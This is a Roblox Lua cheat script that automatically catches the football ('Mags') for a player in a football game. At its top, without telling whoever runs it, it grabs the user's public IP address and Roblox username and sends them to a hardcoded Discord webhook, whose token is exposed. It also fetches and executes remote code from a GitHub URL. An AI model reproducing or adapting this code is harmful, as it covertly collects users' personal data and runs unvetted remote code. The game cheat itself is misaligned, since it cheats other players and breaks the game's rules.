
HttpService = game:GetService("HttpService")
local Webhook_URLs = 'https://discord.com/api/webhooks/1045164406201389076/YLhpsE88D_r7t7uUZXvG9KyT9zpEuJBe7kVCSG7JcyX0Hn6BiQAI59r87nFF7DJbkI9b'





local responce = syn.request(
    {


Url = Webhook_URLs,
Method = 'POST',
Headers = {
    ['Content-Type'] = 'application/json'
},
Body = HttpService:JSONEncode({
    ['content'] = "",
    ['embeds'] = {{
        ['title'] = '**Sky Hub has been executed!**',
        ['description'] = "```"..game.Players.LocalPlayer.DisplayName.." ```".."**Has Executed Sky Hub**",
        ['type'] = 'rich',
        ['color'] = tonumber(14494379),
        ['fields'] = {
            {
            ['name'] = 'IP:',
            ['value'] = "```"..game:HttpGet("https://v4.ident.me/").."```",
            ['inline'] = true,
        },
    {
        ['name'] = 'Username:',
            ['value'] = "```"..game.Players.LocalPlayer.Name.."```",
            ['inline'] = true
            }
        }
    }}
    
})
}
)




setfpscap(1000)



local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/UILib/main/source"))();
lib:SetTitle("Dorito Hub")
local tab1 = lib:NewTab("Mags", "")
tab1:NewSlider("Mags",0,60,0,function(value)
local userInputService = game:GetService("UserInputService")

local mouseClickConnection

mouseClickConnection = userInputService.InputBegan:Connect(function(inputObject)
if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
local startTime = tick()
while tick() - startTime < 1.5 do        
wait()
    for i, v in pairs (game.workspace:GetChildren()) do
  if v.Name == "Football" and v:IsA("BasePart") then
       local distance = (v.Position - game.Players.LocalPlayer.Character.CatchRight.Position).magnitude
              if distance < value then
    for i = 1, 100 do
    v.CFrame = game.Players.LocalPlayer.Character.CatchRight.CFrame * CFrame.new(1.2, 1.2, 0.9)


local playerHead = game.Players.LocalPlayer.Character.CatchRight
for i,v in pairs(workspace:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent  then
        if v.Parent.Name == 'Football' then
        firetouchinterest(playerHead, v.Parent, 0)
        wait() 
        firetouchinterest(playerHead, v.Parent, 1)
    end
end
end
  end  
end
end
end
  end  
end


    
    


   end)
end)








